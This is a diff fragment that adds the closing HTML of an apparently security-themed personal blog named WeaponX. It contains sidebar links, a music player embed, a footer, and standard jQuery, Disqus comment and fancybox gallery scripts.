+    <li><a href="http://www.cnblogs.com/goabout2/" title="goabout2">goabout2</a></li>
+  
+    <li><a href="http://rootkiter.com/" title="RootKiter">RootKiter</a></li>
+  
+  </ul>
+</div>
+
+
+
+  <div class="widget tag">
+  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=270 height=86 src="//music.163.com/outchain/player?type=2&id=427542287&auto=0&height=66"></iframe>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2017 WeaponX
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="http://apps.bdimg.com/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<script type="text/javascript">
+var disqus_shortname = 'weaponx';
+
+(function(){
+  var dsq = document.createElement('script');
+  dsq.type = 'text/javascript';
+  dsq.async = true;
+  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+}());
+</script>
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+</body>
+</html>
